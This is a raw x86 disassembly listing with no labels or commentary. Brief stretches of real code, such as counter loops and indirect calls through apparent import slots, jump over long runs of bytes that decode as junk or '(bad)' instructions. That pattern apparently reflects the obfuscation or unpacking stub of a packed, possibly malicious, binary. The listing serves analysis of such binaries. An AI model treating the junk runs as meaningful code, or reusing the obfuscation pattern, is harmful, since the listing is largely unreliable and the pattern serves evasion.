  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e7c8
  406bcd:	add    DWORD PTR ds:0x43043d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42edcb
  406bdf:	and    edi,DWORD PTR ds:0x4304e3
  406be5:	mov    DWORD PTR ds:0x42edcb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0xcf2d7504
  406bfe:	jne    0x406bc8
  406c00:	cmp    bh,BYTE PTR gs:[esi+0x7e]
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406bac
  406c09:	mov    al,0xa2
  406c0b:	jmp    0x406c45
  406c0d:	repz add ebp,ecx
  406c10:	cmp    DWORD PTR ds:0x22c36898,ebx
  406c16:	xor    cl,BYTE PTR [ebp-0x36d303e8]
  406c1c:	jmp    edx
  406c1e:	push   0x7a
  406c20:	repnz sub BYTE PTR [esi],bh
  406c23:	push   ds
  406c24:	and    edx,DWORD PTR [ebp+0x5c7f9d70]
  406c2a:	or     eax,0xb6d780fe
  406c2f:	pushf  
  406c30:	add    BYTE PTR [ecx],dh
  406c32:	loop   0x406c10
  406c34:	jbe    0x406bd4
  406c36:	xchg   esp,eax
  406c37:	ins    DWORD PTR es:[edi],dx
  406c38:	frstor [esi-0x30fa8870]
  406c3e:	add    DWORD PTR [esi],ecx
  406c40:	mov    edx,0xdb0b332a
  406c45:	adc    al,0x91
  406c47:	hlt    
  406c48:	dec    edi
  406c49:	xchg   edx,edx
  406c4b:	mov    al,0xe5
  406c4d:	sub    al,0xf1
  406c4f:	int    0xe4
  406c51:	scas   eax,DWORD PTR es:[edi]
  406c52:	aas    
  406c53:	aas    
  406c54:	or     DWORD PTR [esi+eax*1],ebx
  406c57:	push   edx
  406c58:	out    0x5d,eax
  406c5a:	dec    esi
  406c5b:	jg     0x406c92
  406c5d:	lds    edx,FWORD PTR [edi]
  406c5f:	mov    edi,0xedd07045
  406c64:	stos   BYTE PTR es:[edi],al
  406c65:	pushfw 
  406c67:	icebp  
  406c68:	cwde   
  406c69:	adc    DWORD PTR [edi+0x61f948fd],edi
  406c6f:	pop    edx
  406c70:	popf   
  406c71:	xchg   esp,eax
  406c72:	mov    cl,0x38
  406c74:	xchg   ebx,eax
  406c75:	out    0x17,eax
  406c77:	push   ss
  406c78:	sbb    DWORD PTR [ebp+0x5dd5bde4],edx
  406c7e:	sub    ebp,esp
  406c80:	pop    ds
  406c81:	fidivr WORD PTR [eax-0x28]
  406c84:	hlt    
  406c85:	jl     0x406cf4
  406c87:	or     DWORD PTR [eax],edi
  406c89:	js     0x406c2d
  406c8b:	pusha  
  406c8c:	push   ss
  406c8d:	shl    ah,0x32
  406c90:	in     al,dx
  406c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c92:	mov    cs,ebx
  406c94:	dec    ecx
  406c95:	inc    ebp
  406c96:	pop    ss
  406c97:	fld    TBYTE PTR [edx+0x4c]
  406c9a:	mov    al,0x65
  406c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c9d:	stos   BYTE PTR es:[edi],al
  406c9e:	mov    ebx,0x394a3e8
  406ca3:	mov    esi,0x92aab5e4
  406ca9:	xor    DWORD PTR [edi-0x27],0x58
  406cad:	fdivr  DWORD PTR [ebp+0x8]
  406cb0:	mov    ah,0xe1
  406cb2:	cmp    dl,BYTE PTR [ebp-0x1f33d592]
  406cb8:	or     esi,eax
  406cba:	fiadd  WORD PTR [esi+0x4f]
  406cbd:	popa   
  406cbe:	std    
  406cbf:	arpl   cx,bx
  406cc1:	shl    BYTE PTR [ebp-0x18],cl
  406cc4:	lods   al,BYTE PTR ds:[esi]
  406cc5:	jne    0x406ce9
  406cc7:	idiv   BYTE PTR [ecx+0x1d86cf62]
  406ccd:	int3   
  406cce:	lock (bad) 
  406cd0:	shl    BYTE PTR [ecx+0x64],0x1b
  406cd4:	pop    es
  406cd5:	sbb    eax,0x7c3e1e67
  406cda:	xor    ebx,ecx
  406cdc:	adc    eax,0x317e3fb0
  406ce1:	mov    dl,0xb8
  406ce3:	cdq    
  406ce4:	pop    ss
  406ce5:	retf   0x9970
  406ce8:	stos   DWORD PTR es:[edi],eax
  406ce9:	outs   dx,DWORD PTR ds:[esi]
  406cea:	and    DWORD PTR [esi+0x61890dc5],0xffffff9b
  406cf1:	pop    eax
  406cf2:	retf   0x1bb3
  406cf5:	in     al,0x71
  406cf7:	js     0x406ca1
  406cf9:	(bad)  [ebx-0x7f]
  406cfc:	jge    0xdf040b9f
  406d02:	cwde   
  406d03:	aad    0xcc
  406d05:	push   edi
  406d06:	dec    edi
  406d07:	adc    BYTE PTR [ebp-0x259930c4],dh
  406d0d:	scas   eax,DWORD PTR es:[edi]
  406d0e:	dec    edx
  406d0f:	push   ds
  406d10:	jge    0x406c99
  406d12:	outs   dx,DWORD PTR ds:[esi]
  406d13:	pop    ss
  406d14:	test   DWORD PTR [si-0x6389],0x9d637b9a
  406d1d:	(bad)
  406d21:	push   ss
  406d22:	pop    ebx
  406d23:	mov    eax,ds:0xe0739ec4
  406d28:	adc    DWORD PTR [edx+0x13c5d32e],ebx
  406d2e:	scas   eax,DWORD PTR es:[edi]
  406d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d30:	aad    0x66
  406d32:	xlat   BYTE PTR ds:[ebx]
  406d33:	arpl   WORD PTR [eax],si
  406d35:	mov    bl,0xff
  406d37:	cdq    
  406d38:	xchg   BYTE PTR [edx],al
  406d3a:	fs dec esi
  406d3c:	js     0x406cf1
  406d3e:	cmp    al,0x63
  406d40:	in     eax,dx
  406d41:	fiadd  DWORD PTR ds:0x504eb6f
  406d47:	mov    ds:0x7362b2c1,al
  406d4c:	mov    ah,0x6c
  406d4e:	lea    ebx,[edx]
  406d50:	xchg   ebp,eax
  406d51:	mov    ds:0xfa0bdabb,al
  406d56:	(bad)  
  406d58:	jae    0x406dd1
  406d5a:	fbld   TBYTE PTR [edx-0x2b]
  406d5d:	arpl   di,sp
  406d5f:	out    dx,eax
  406d60:	jo     0x406db5
  406d62:	push   ebx
  406d63:	mov    ch,0x1
  406d65:	fisttp DWORD PTR [edx-0x634788ec]
  406d6b:	push   esp
  406d6c:	push   ebp
  406d6d:	jle    0x406db2
  406d6f:	sbb    al,0x87
  406d71:	iret   
  406d72:	aad    0xc2
  406d74:	inc    esp
  406d75:	les    eax,FWORD PTR [ebp-0x6d]
  406d78:	mov    al,ds:0x621fd5a1
  406d7d:	je     0x406d30
  406d7f:	lods   eax,DWORD PTR ds:[esi]
  406d80:	enter  0x28d,0x55
  406d84:	nop
  406d85:	sub    DWORD PTR [ebx+0x73ed4c1f],ebx
  406d8b:	add    esp,DWORD PTR [edx+eax*4+0x3bd3c8cb]
  406d92:	push   edi
  406d93:	dec    edi
  406d94:	(bad)  
  406d95:	stc    
  406d96:	lea    esp,[ebx+0x71481f6e]
  406d9c:	add    edx,ecx
  406d9e:	and    DWORD PTR ds:0x4304df,0x0
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x3b477b7b],si
  406e0c:	jmp    0x7e7e:0x38f12511
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e29
  406e18:	or     al,0x77
  406e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e1b:	push   esi
  406e1c:	enter  0x54,0xcd
  406e20:	mov    eax,0x285d71c7
  406e25:	jp     0x406e12
  406e27:	or     ecx,DWORD PTR [ebp-0x4b0dc7e0]
  406e2d:	fsubr  QWORD PTR [eax+0x7c]
  406e30:	lods   eax,DWORD PTR ds:[esi]
  406e31:	test   DWORD PTR [ebx],0x9b7b3e53
  406e37:	mov    ds:0xfea637d1,eax
  406e3c:	int    0x5f
  406e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e3f:	jmp    FWORD PTR [edi-0xb]
  406e42:	out    0xec,eax
  406e44:	out    0xca,eax
  406e46:	jecxz  0x406def
  406e48:	fs mov dl,0x62
  406e4b:	scas   eax,DWORD PTR es:[edi]
  406e4c:	and    esi,esi
  406e4e:	jae    0x406e46
  406e50:	rcl    DWORD PTR [ebp+0x50],cl
  406e53:	add    edi,edx
  406e55:	xchg   edi,eax
  406e56:	(bad)  
  406e57:	repnz or dh,dh
  406e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5b:	aas    
  406e5c:	retf   0xc253
  406e5f:	out    0xaa,eax
  406e61:	pop    es
  406e62:	xchg   DWORD PTR [edi+0x66],ebx
  406e65:	or     al,ah
  406e67:	std    
  406e68:	jl     0x406dfc
  406e6a:	and    eax,0x24c6aa8b
  406e6f:	jmp    0x406ec3
  406e71:	(bad)  [esi-0x60]
  406e74:	clc    
  406e75:	cmovbe edx,DWORD PTR [ebx-0x75bd32ef]
  406e7c:	or     ebp,DWORD PTR [edi+0x47c5431e]
  406e82:	jge    0x406eed
  406e84:	fadd   QWORD PTR [eax+0x30]
  406e87:	and    ebp,DWORD PTR [eax]
  406e89:	xor    al,0x76
  406e8b:	pushf  
  406e8c:	push   0xffffff9f
  406e8e:	sbb    DWORD PTR [esp+ebp*1],0x4d
  406e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e93:	fwait
  406e94:	in     al,dx
  406e95:	ss leave 
  406e97:	hlt    
  406e98:	ins    DWORD PTR es:[edi],dx
  406e99:	mov    esp,0xb982e7a
  406e9e:	inc    eax
  406e9f:	mov    esp,0x3df612dc
  406ea4:	jl     0x406ef7
  406ea6:	cmp    ah,0x4e
  406ea9:	popa   
  406eaa:	cli    
  406eab:	fcomp  DWORD PTR [ebp+0x33]
  406eae:	inc    edi
  406eaf:	mov    al,ds:0xba5f1eb6
  406eb4:	jnp    0x406e91
  406eb6:	sahf   
  406eb7:	sub    al,0xd7
  406eb9:	pop    es
  406eba:	pop    ecx
  406ebb:	sbb    DWORD PTR [edi],0xffffffab
  406ebe:	fxtract 
  406ec0:	popa   
  406ec1:	jl     0x406ed4
  406ec3:	lahf   
  406ec4:	(bad)  
  406ec5:	adc    ch,BYTE PTR [eax]
  406ec7:	adc    al,0x14
  406ec9:	les    ebp,FWORD PTR [ecx+0x52f20e1]
  406ecf:	jmp    DWORD PTR [eax+0x376ac0ed]
  406ed5:	pop    ebx
  406ed6:	inc    edx
  406ed7:	jg     0x406ed9
  406ed9:	and    DWORD PTR [eax],esi
  406edb:	mov    ah,0xaf
  406edd:	retf   
  406ede:	inc    ebp
  406edf:	mov    al,ds:0x1810a36
  406ee4:	push   ds
  406ee5:	jmp    0x406e6f
  406ee7:	lahf   
  406ee8:	pop    ecx
  406ee9:	sbb    eax,0x84a1302a
  406eee:	mov    dh,0xe8
  406ef0:	mov    edx,0x905406c1
  406ef5:	adc    BYTE PTR [ecx+0x5dbe553c],dh
  406efb:	jl     0x406ebe
  406efd:	mov    ah,0x11
  406eff:	hlt    
  406f00:	mov    bl,0x65
  406f02:	(bad)  
  406f03:	in     eax,dx
  406f04:	shl    BYTE PTR [di],0x3a
  406f08:	ret    0x6e65
  406f0b:	iret   
  406f0c:	stos   DWORD PTR es:[edi],eax
  406f0d:	jecxz  0x406f6a
  406f0f:	dec    ch
  406f11:	loop   0x406f3d
  406f13:	push   eax
  406f14:	rcr    bl,0x75
  406f17:	xor    edx,DWORD PTR [ebx-0xfa3a31f]
  406f1d:	(bad)  
  406f1e:	stc    
  406f1f:	add    dl,bl
  406f21:	add    eax,0x582817b1
  406f26:	adc    al,0xd9
  406f28:	stos   BYTE PTR es:[edi],al
  406f29:	pop    edx
  406f2a:	add    al,0x47
  406f2c:	fcom   QWORD PTR [ecx-0x14b85e2d]
  406f32:	pop    es
  406f33:	aad    0x1
  406f35:	push   es
  406f36:	pop    ebp
  406f37:	fidiv  WORD PTR [edx+ebx*4-0x74]
  406f3b:	add    al,0x70
  406f3d:	jnp    0x406fbd
  406f3f:	or     BYTE PTR [esi-0x3c084c99],bh
  406f45:	sub    ecx,DWORD PTR [edi-0x76]
  406f48:	xchg   edx,eax
  406f49:	lea    esi,[edi-0x2e]
  406f4c:	cmp    eax,0x8a602d9c
  406f51:	add    dh,BYTE PTR [ebx+0x43]
  406f54:	or     esp,edx
  406f56:	pushf  
  406f57:	icebp  
  406f58:	aaa    
  406f59:	cmp    BYTE PTR [ebx],bh
  406f5b:	jmp    0xa460:0xa9cdbe5a
  406f62:	enter  0x22d3,0xc2
  406f66:	xchg   esi,eax
  406f67:	fsub   QWORD PTR [edx+ebx*1+0x1f]
  406f6b:	ficomp DWORD PTR [edx-0x194cec08]
  406f71:	mov    DWORD PTR [eax],ecx
  406f73:	rcl    DWORD PTR [eax+0x5c],cl
  406f76:	outs   dx,BYTE PTR ds:[esi]
  406f77:	add    al,0x8a
  406f79:	stos   BYTE PTR es:[edi],al
  406f7a:	hlt    
  406f7b:	add    ch,BYTE PTR [ecx-0x4e]
  406f7e:	lea    edi,[ecx+eiz*8]
  406f81:	cmp    al,0xb6
  406f83:	clc    
  406f84:	cmp    al,0xa6
  406f86:	dec    eax
  406f87:	xor    eax,0x22ddbae5
  406f8c:	dec    esi
  406f8d:	xchg   esi,eax
  406f8e:	push   cs
  406f8f:	mul    BYTE PTR [ebp+0x6e]
  406f92:	in     eax,0xcf
  406f94:	jbe    0x406fed
  406f96:	xchg   ebx,eax
  406f97:	xchg   ebp,eax
  406f98:	scas   al,BYTE PTR es:[edi]
  406f99:	xor    BYTE PTR [edi],ch
  406f9b:	pop    ds
  406f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f9d:	jecxz  0x406f80
  406f9f:	(bad)  
  406fa0:	lahf   
  406fa1:	mov    al,ds:0xec46177c
  406fa6:	add    ch,0xcc
  406fa9:	cmp    eax,edx
  406fab:	mov    DWORD PTR [ebp-0x8],edx
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430465
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430445,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0xd05a3d82,edx
  406fd4:	jecxz  0x407030
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x40701c
  406fdf:	push   eax
  406fe0:	jmp    0x591d:0xae9d9f2f
  406fe7:	popa   
  406fe8:	push   es
  406fe9:	sbb    eax,0x2033bf27
  406fee:	inc    edi
  406fef:	dec    eax
  406ff0:	js     0x407048
  406ff2:	cmp    ch,BYTE PTR [ecx-0x40887c2e]
  406ff8:	mov    WORD PTR [eax],?
  406ffa:	aad    0xe1
  406ffc:	xchg   ecx,eax
  406ffd:	shl    DWORD PTR [esi],0x6e
  407000:	sbb    eax,0xa68d5a6
  407005:	lea    esi,[eax-0x1a426311]
  40700b:	mov    edi,0x4c0e5d57
  407010:	cmp    BYTE PTR [edx],0x84
  407013:	frstor [eax+0x3e]
  407016:	cwde   
  407017:	aaa    
  407018:	jns    0x406fce
  40701a:	and    al,0x86
  40701c:	push   0x684400d4
  407021:	repnz push ebp
  407023:	pop    ebx
  407024:	cmp    bl,BYTE PTR [ebx+0x679c4c34]
  40702a:	out    0x6f,al
  40702c:	adc    bh,BYTE PTR [ecx+ebx*1]
  40702f:	sub    ebx,esp
  407031:	jmp    0x4070a3
  407033:	jns    0x406fc3
  407035:	or     eax,DWORD PTR ds:[ebx]
  407038:	pop    ebp
  407039:	push   DWORD PTR [ebx]
  40703b:	xor    al,0x3f
  40703d:	gs push ebx
  40703f:	iret   
  407040:	repz jo 0x407018
  407043:	mov    WORD PTR [eax],ds
  407045:	sub    BYTE PTR [eax+0x39],dl
  407048:	and    dh,bl
  40704a:	shl    bl,1
  40704c:	and    ebx,eax
  40704e:	test   eax,0xc23bfd65
  407053:	mov    esp,0x872b4296
  407058:	adc    ebx,DWORD PTR [ecx+0x7d]
  40705b:	(bad)  
  40705d:	mov    DWORD PTR [ebp-0x1aa95581],0xeaa8bdcb
  407067:	pop    edx
  407068:	ret    
  407069:	sbb    eax,0xdbb9140c
  40706e:	call   0xbb54:0x363e6fef
  407075:	test   DWORD PTR [ecx-0x180e4fab],eax
  40707b:	push   edx
  40707c:	sub    edx,DWORD PTR [eax+0x28]
  40707f:	and    al,0xa8
  407081:	iret   
  407082:	test   al,0x6e
  407084:	and    ah,bh
  407086:	inc    ecx
  407087:	inc    eax
  407088:	addr16 mov bl,0x32
  40708b:	aad    0x5e
  40708d:	mov    ds:0xb540712d,al
  407092:	(bad)  
  407094:	or     eax,0x8a73eee3
  407099:	dec    BYTE PTR [eax-0x7f]
  40709c:	inc    ebp
  40709d:	lea    esp,[edx+0x46]
  4070a0:	push   esi
  4070a1:	retf   
  4070a2:	xor    eax,0xfd8d0562
  4070a7:	push   ss
  4070a8:	push   ss
  4070a9:	cmc    
  4070aa:	push   0xffffffc3
  4070ac:	mov    ebp,0x138f3dcc
  4070b1:	and    BYTE PTR [esi+ebp*2+0x1a],cl
  4070b5:	inc    esp
  4070b6:	xchg   ebp,eax
  4070b7:	dec    esp
  4070b8:	pop    eax
  4070b9:	imul   eax,DWORD PTR [ebp+eiz*2+0x26],0xa91510bf
  4070c1:	ficomp DWORD PTR [eax+0x6e060681]
  4070c7:	jno    0x4070e7
  4070c9:	(bad)  
  4070ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070cb:	mov    ds:0x45517443,al
  4070d0:	idiv   BYTE PTR [edi+0x25]
  4070d3:	mov    ch,0xc7
  4070d5:	es pop ss
  4070d7:	mov    cl,0xbb
  4070d9:	(bad)  
  4070da:	inc    esp
  4070db:	xchg   esp,eax
  4070dc:	leave  
  4070dd:	sbb    esp,DWORD PTR [ecx-0xd]
  4070e0:	cmp    esi,esi
  4070e2:	fadd   DWORD PTR [ecx]
  4070e4:	lods   al,BYTE PTR ds:[esi]
  4070e5:	sbb    ecx,0x380ba1f0
  4070eb:	mov    ecx,0x147a0092
  4070f0:	hlt    
  4070f1:	idiv   BYTE PTR [eax+0x51]
  4070f4:	aam    0x75
  4070f6:	loop   0x4070b6
  4070f8:	cli    
  4070f9:	fdivr  DWORD PTR [edi+ecx*8]
  4070fc:	mov    bh,0xfc
  4070fe:	sub    DWORD PTR [ebx],esi
  407100:	lods   eax,DWORD PTR ds:[esi]
  407101:	stc    
  407102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407103:	or     al,0x34
  407105:	inc    eax
  407106:	sbb    cl,bh
  407108:	jmp    0x24c53ed3
  40710d:	ret    
  40710e:	sub    BYTE PTR [edx],bl
  407110:	add    DWORD PTR [edx+0x5a],ebp
  407113:	pop    edi
  407114:	push   eax
  407115:	inc    edi
  407116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407117:	xchg   dx,ax
  407119:	dec    ebx
  40711a:	hlt    
  40711b:	mov    WORD PTR [edi+ebp*8-0x43fc9fa3],?
  407122:	add    esp,DWORD PTR [edi]
  407124:	dec    ebp
  407125:	or     eax,0xc3c9d1dc
  40712a:	xchg   edx,eax
  40712b:	jo     0x4070ad
  40712d:	and    al,0x2b
  40712f:	add    al,0x8a
  407131:	js     0x407123
  407133:	lods   eax,DWORD PTR ds:[esi]
  407134:	in     al,dx
  407135:	dec    edi
  407136:	enter  0xc70f,0x7c
  40713a:	cmc    
  40713b:	cmp    al,0x29
  40713d:	nop
  40713e:	mov    bh,0x5f
  407140:	outs   dx,DWORD PTR ds:[esi]
  407141:	int3   
  407142:	or     eax,0xb5c964e1
  407147:	aam    0xd9
  407149:	cmc    
  40714a:	add    esi,DWORD PTR [eax-0x75f4bed4]
  407150:	test   BYTE PTR [ebx+edi*1-0x8fec999],bh
  407157:	push   es
  407158:	xor    ah,BYTE PTR [edx+0x76d21c05]
  40715e:	cmp    DWORD PTR [ecx],esp
  407160:	ror    BYTE PTR [eax-0x2f],cl
  407163:	jg     0x407149
  407165:	inc    ebp
  407166:	out    0x3c,eax
  407168:	mov    cl,0xdb
  40716a:	mov    ch,0xb5
  40716c:	test   al,0xf0
  40716e:	ins    DWORD PTR es:[edi],dx
  40716f:	stos   DWORD PTR es:[edi],eax
  407170:	and    esi,DWORD PTR [edi-0x77]
  407173:	push   ebp
  407174:	or     al,0x81
  407176:	and    eax,0x42e7c0
  40717b:	add    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [eax],al
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x62093f15
  4072a7:	popa   
  4072a8:	sbb    BYTE PTR [ecx-0x75818139],0x7f
  4072af:	jle    0x40732f
  4072b1:	imul   eax,DWORD PTR [edx-0x58],0xe395fcf6
  4072b8:	dec    esp
  4072b9:	mov    edi,DWORD PTR [edi]
  4072bb:	sbb    edx,DWORD PTR [ecx]
  4072bd:	daa    
  4072be:	ret    
  4072bf:	std    
  4072c0:	js     0x4072a9
  4072c2:	inc    eax
  4072c3:	sub    DWORD PTR [edi],esi
  4072c5:	push   cs
  4072c6:	and    dl,BYTE PTR [edi-0x3]
  4072c9:	push   DWORD PTR [edx]
  4072cb:	ja     0x407300
  4072cd:	out    dx,al
  4072ce:	pop    ss
  4072cf:	fnstcw WORD PTR [ebp-0x12]
  4072d2:	xchg   esi,eax
  4072d3:	jl     0x407263
  4072d5:	std    
  4072d6:	inc    esi
  4072d7:	lds    ebp,FWORD PTR [ebp+eiz*2-0x58]
  4072db:	ret    0xcd77
  4072de:	push   eax
  4072df:	not    BYTE PTR [edx+0x24]
  4072e2:	popf   
  4072e3:	out    0x75,al
  4072e5:	stos   DWORD PTR es:[edi],eax
  4072e6:	mov    ebx,0x17493300
  4072eb:	mul    BYTE PTR [eax+0x32]
  4072ee:	xor    dl,bl
  4072f0:	xchg   DWORD PTR [edi+0x3e],ebp
  4072f3:	sbb    dl,bl
  4072f5:	pop    ebx
  4072f6:	lahf   
  4072f7:	inc    eax
  4072f8:	xor    al,0x2b
  4072fa:	dec    esi
  4072fb:	mov    ds:0xb55718f2,al
  407300:	dec    edx
  407301:	(bad)  
  407303:	cmp    ch,al
  407305:	xlat   BYTE PTR ds:[ebx]
  407306:	(bad)  
  407307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407308:	mov    al,0x90
  40730a:	call   0xa591:0x2e5cea44
  407311:	loopne 0x407374
  407313:	jle    0x407377
  407315:	push   edx
  407316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407317:	dec    esi
  407318:	mov    dl,0x5
  40731a:	or     cl,ch
  40731c:	adc    dl,cl
  40731e:	mov    ecx,0x4a21998
  407323:	push   cs
  407324:	pop    ds
  407325:	xchg   edi,eax
  407326:	and    DWORD PTR [edx],edi
  407328:	jb     0x4072fe
  40732a:	cmp    eax,0x3c608798
  40732f:	cdq    
  407330:	cmp    BYTE PTR [ecx+0x40],dl
  407333:	(bad)  
  407334:	pushf  
  407335:	push   eax
  407336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407337:	cmp    al,BYTE PTR [esi]
  407339:	js     0x40734c
  40733b:	fidiv  WORD PTR [ecx+0x76]
  40733e:	jge    0x40738e
  407340:	jmp    0x611b6cc
  407345:	ret    
  407346:	jl     0x407360
  407348:	fs loope 0x40736e
  40734b:	lock and ah,bl
  40734e:	jns    0x4073bf
  407350:	(bad)  
  407351:	mov    es:0x4cc839f3,eax
  407357:	xchg   ebp,eax
  407358:	loop   0x4072f8
  40735a:	xchg   esi,eax
  40735b:	push   ecx
  40735c:	out    0xbb,eax
  40735e:	ds push ds
  407360:	dec    esp
  407361:	ret    
  407362:	je     0x40738f
  407364:	jae    0x40730f
  407366:	faddp  st(6),st
  407368:	add    DWORD PTR [edx+0x3176938a],esp
  40736e:	inc    ecx
  40736f:	or     DWORD PTR [edx+0x3a9644ed],ecx
  407375:	popf   
  407376:	hlt    
  407377:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  407379:	xor    BYTE PTR [ebx+0x6e],bh
  40737c:	int3   
  40737d:	iret   
  40737e:	push   eax
  40737f:	or     cl,BYTE PTR [edi-0x7a8e1fe0]
  407385:	inc    esp
  407386:	xor    eax,0xe973bfd9
  40738b:	push   cs
  40738c:	ret    0xf5e5
  40738f:	jecxz  0x407355
  407391:	scas   al,BYTE PTR es:[edi]
  407392:	inc    esp
  407393:	cmp    BYTE PTR [edi+0x259551f7],cl
  407399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40739a:	push   0x4
  40739c:	sbb    ebp,DWORD PTR [esp+ebx*4-0x7b353e6]
  4073a3:	sub    bh,ch
  4073a5:	into   
  4073a6:	(bad)  
  4073a7:	aad    0x93
  4073a9:	adc    DWORD PTR [ebx],ebx
  4073ab:	push   edx
  4073ac:	xor    al,BYTE PTR [edi]
  4073ae:	test   DWORD PTR [eax+0x46cbbfc0],edi
  4073b4:	outs   dx,DWORD PTR ds:[esi]
  4073b5:	jmp    0x95d5bd39
  4073ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073bb:	(bad)  
  4073bc:	pushw  es
  4073be:	aas    
  4073bf:	out    dx,eax
  4073c0:	adc    dl,BYTE PTR [edi+0x4c618681]
  4073c6:	dec    edi
  4073c7:	js     0x407395
  4073c9:	in     al,dx
  4073ca:	sahf   
  4073cb:	aad    0xed
  4073cd:	jg     0x4073f6
  4073cf:	ds sti 
  4073d1:	lds    ebx,FWORD PTR [esi-0x12]
  4073d4:	imul   ebp,ecx,0xd804c097
  4073da:	and    cl,bl
  4073dc:	shl    esp,1
  4073de:	lods   al,BYTE PTR ds:[esi]
  4073df:	push   0x65fcde7
  4073e4:	or     eax,0xd66ae9d1
  4073e9:	ins    BYTE PTR es:[edi],dx
  4073ea:	mov    esi,0x2658f434
  4073ef:	pop    esp
  4073f0:	jecxz  0x407443
  4073f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
